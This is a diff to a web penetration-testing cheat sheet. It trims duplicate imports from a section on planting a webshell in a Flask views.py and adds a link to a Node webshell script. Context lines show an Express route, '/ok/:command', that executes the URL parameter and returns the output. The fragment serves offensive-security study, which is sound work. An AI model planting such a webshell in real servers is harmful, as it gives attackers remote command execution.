@@ -810,11 +810,6 @@ https://tryhackme.com/room/sqlilab
 ### Webshell Infecting views.py - Python (Flask)
 ```
 import os
-from app.utils import get_file_name
-from flask import render_template, request, send_file
-from app import app
-...
-import os
 from flask import Flask,request,os
 
 app = Flask(__name__)
@@ -844,6 +839,7 @@ app.get('/ok/:command', (req, res) =>
 res.send(Exec(req.params.command))
 );
 ```
+https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/webshells/ok.js
 
 ### SQL Injection Out-Of-Band, etc
 
